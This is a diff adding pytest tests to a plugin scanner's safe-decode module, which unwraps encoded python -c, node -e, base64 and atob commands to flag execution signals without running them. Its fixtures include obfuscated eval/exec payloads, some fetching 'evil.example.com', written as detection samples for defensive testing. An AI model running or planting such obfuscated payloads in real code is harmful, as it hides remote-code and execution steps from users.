@@ -5,9 +5,13 @@ from __future__ import annotations
 import base64
 from pathlib import Path
 
+import pytest
+
+import codex_plugin_scanner.guard.runtime.safe_decode as safe_decode_module
 from codex_plugin_scanner.guard.runtime.safe_decode import (
     DecodedLayer,
     DecodeResult,
+    clear_decode_cache,
     decode_layers,
 )
 
@@ -115,6 +119,47 @@ def test_powershell_encoded_command_extracted() -> None:
     assert any(layer.encoding == "powershell-encoded" for layer in result.layers)
 
 
+def test_python_c_argument_inspected_without_execution(tmp_path: Path) -> None:
+    canary = tmp_path / "python-c-canary.txt"
+    payload = f"python -c \"exec(\\\"open('{canary}', 'w').write('bad')\\\")\""
+
+    result = decode_layers(payload)
+
+    assert any(layer.encoding == "python-c" for layer in result.layers)
+    assert result.exec_signals
+    assert not canary.exists()
+
+
+def test_python_c_argument_without_space_is_inspected() -> None:
+    result = decode_layers("python -c\"exec('inline')\"")
+
+    assert any(layer.encoding == "python-c" for layer in result.layers)
+    assert result.exec_signals
+
+
+def test_node_e_argument_inspected_through_nested_atob() -> None:
+    inner = "fetch('http://evil.example.com')"
+    encoded = _b64(inner)
+    payload = f"node -e \"eval(atob('{encoded}'))\""
+
+    result = decode_layers(payload)
+
+    encodings = tuple(layer.encoding for layer in result.layers)
+    assert "node-e" in encodings
+    assert "js-atob" in encodings
+    assert result.final_text == inner
+
+
+def test_node_e_argument_without_space_is_inspected() -> None:
+    inner = "fetch('http://evil.example.com')"
+    encoded = _b64(inner)
+    result = decode_layers(f"node -e\"eval(atob('{encoded}'))\"")
+
+    assert any(layer.encoding == "node-e" for layer in result.layers)
+    assert any(layer.encoding == "js-atob" for layer in result.layers)
+    assert result.final_text == inner
+
+
 def test_js_atob_payload_extracted() -> None:
     inner = "fetch('http://evil.example.com')"
     encoded = _b64(inner)
@@ -144,6 +189,95 @@ def test_timeout_respected() -> None:
     payload = _b64(_b64(_b64("deeply nested content")))
     result = decode_layers(payload, max_time_ms=0.001)
     assert result.timed_out or len(result.layers) <= 1
+
+
+def test_repeated_payloads_use_versioned_decode_cache(monkeypatch: pytest.MonkeyPatch) -> None:
+    clear_decode_cache()
+    payload = _b64("exec('cached payload')")
+    calls = 0
+    original = safe_decode_module._find_encoded_candidate
+
+    def wrapped(text: str) -> tuple[safe_decode_module.EncodingType, str] | None:
+        nonlocal calls
+        calls += 1
+        return original(text)
+
+    monkeypatch.setattr(safe_decode_module, "_find_encoded_candidate", wrapped)
+
+    first = decode_layers(payload)
+    after_first = calls
+    second = decode_layers(payload)
+
+    assert after_first > 0
+    assert calls == after_first
+    assert first is not second
+    assert first.layers == second.layers
+    assert first.final_text == second.final_text
+
+
+def test_decode_cache_access_marks_entry_recent(monkeypatch: pytest.MonkeyPatch) -> None:
+    clear_decode_cache()
+    monkeypatch.setattr(safe_decode_module, "_DECODE_CACHE_LIMIT", 2)
+    first = _b64("exec('first')")
+    second = _b64("exec('second')")
+    third = _b64("exec('third')")
+    first_key = safe_decode_module.decode_cache_key(first)
+    second_key = safe_decode_module.decode_cache_key(second)
+    third_key = safe_decode_module.decode_cache_key(third)
+
+    decode_layers(first)
+    decode_layers(second)
+    decode_layers(first)
+    decode_layers(third)
+
+    assert first_key in safe_decode_module._DECODE_CACHE
+    assert second_key not in safe_decode_module._DECODE_CACHE
+    assert third_key in safe_decode_module._DECODE_CACHE
+
+
+def test_decode_cache_key_changes_with_detector_version() -> None:
+    payload = _b64("exec('versioned payload')")
+
+    current_key = safe_decode_module.decode_cache_key(payload)
+    next_key = safe_decode_module.decode_cache_key(payload, detector_version="safe-decode.vNEXT")
+
+    assert current_key != next_key
+
+
+def test_unescape_command_argument_handles_backslashes_before_quotes() -> None:
+    value = r"print(\"C:\\tmp\")"
+
+    assert safe_decode_module._unescape_command_argument(value) == 'print("C:\\tmp")'
+
+
+def test_safe_decode_signal_receipt_payload_exports_redacted_summary() -> None:
+    from codex_plugin_scanner.guard.receipts import build_receipt
+    from codex_plugin_scanner.guard.runtime.detectors import SafeDecodeDetector
+
+    encoded = _b64("eval('receipt payload')")
+
+    class _FakeAction:
+        prompt_text = encoded
+
+    signals = SafeDecodeDetector().detect(_FakeAction(), None)  # type: ignore[arg-type]
+    receipt = build_receipt(
+        harness="codex",
+        artifact_id="codex:project:prompt",
+        artifact_hash="sha256-safe-decode",
+        policy_decision="require-reapproval",
+        capabilities_summary="Prompt reviewed",
+        changed_capabilities=["runtime-detector"],
+        provenance_summary="runtime detector proof",
+        artifact_name="prompt",
+        source_scope="project",
+        scanner_evidence=[signals[0].to_dict()],
+    )
+    evidence = receipt.to_dict()["scanner_evidence"]
+
+    assert isinstance(evidence, list)
+    assert evidence[0]["detector"] == "safe-decode.content"
+    assert "Decoded" in str(evidence[0]["plain_reason"])
+    assert "safe-decode.v2" in str(evidence[0]["technical_detail"])
 
 
 def test_size_exceeded_when_input_too_large() -> None:
